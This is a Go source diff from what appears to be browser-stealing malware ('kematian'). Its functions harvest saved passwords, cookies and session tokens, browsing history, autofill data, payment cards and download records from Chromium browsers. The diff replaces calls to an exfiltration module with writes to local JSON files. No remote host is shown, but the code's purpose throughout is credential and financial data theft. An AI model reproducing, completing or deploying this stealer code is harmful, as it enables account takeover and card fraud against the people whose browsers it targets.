@@ -10,43 +10,33 @@ import (
 	"kdot/kematian/browsers/chromium/pass"
 	"kdot/kematian/browsers/chromium/structs"
 	"kdot/kematian/browsers/util"
-	"kdot/kematian/exfil"
+	"os"
 )
 
 func GetBrowserPasswords(browsers []structs.Browser) {
 	//fmt.Println(pass.GetPasswords())
-	//os.WriteFile("passwords.json", []byte(pass.Get(browsers)), 0644)
-	exfil.PrintStuff("passwords.json", pass.Get(browsers))
+	os.WriteFile("passwords.json", []byte(pass.Get(browsers)), 0644)
 }
 
 func GetBrowserCookies(browsers []structs.Browser) {
-	outCookies := cookies.GetCookiesAuto(browsers)
-	for _, cookie := range outCookies {
-		//os.WriteFile("cookies_netscape_"+cookie.browserName+".txt", []byte(cookie.cookies), 0644)
-		exfil.PrintStuff("cookies_netscape_"+cookie.BrowserName+".txt", cookie.Cookies)
-	}
-
+	cookies.GetTokensAuto(browsers)
 }
 
 func GetBrowserHistory(browsers []structs.Browser) {
 	//fmt.Println(history.GetHistory())
-	//os.WriteFile("history.json", []byte(history.Get(browsers)), 0644)
-	exfil.PrintStuff("history.json", history.Get(browsers))
+	os.WriteFile("history.json", []byte(history.Get(browsers)), 0644)
 }
 
 func GetBrowserAutofill(browsers []structs.Browser) {
-	//os.WriteFile("autofill.json", []byte(autofill.Get(browsers)), 0644)
-	exfil.PrintStuff("autofill.json", autofill.Get(browsers))
+	os.WriteFile("autofill.json", []byte(autofill.Get(browsers)), 0644)
 }
 
 func GetBrowserCards(browsers []structs.Browser) {
-	//os.WriteFile("cards.json", []byte(cards.Get(browsers)), 0644)
-	exfil.PrintStuff("cards.json", cards.Get(browsers))
+	os.WriteFile("cards.json", []byte(cards.Get(browsers)), 0644)
 }
 
 func GetBrowserDownloads(browsers []structs.Browser) {
-	//os.WriteFile("downloads.json", []byte(downloads.Get(browsers)), 0644)
-	exfil.PrintStuff("downloads.json", downloads.Get(browsers))
+	os.WriteFile("downloads.json", []byte(downloads.Get(browsers)), 0644)
 }
 
 func GetBrowserData() {
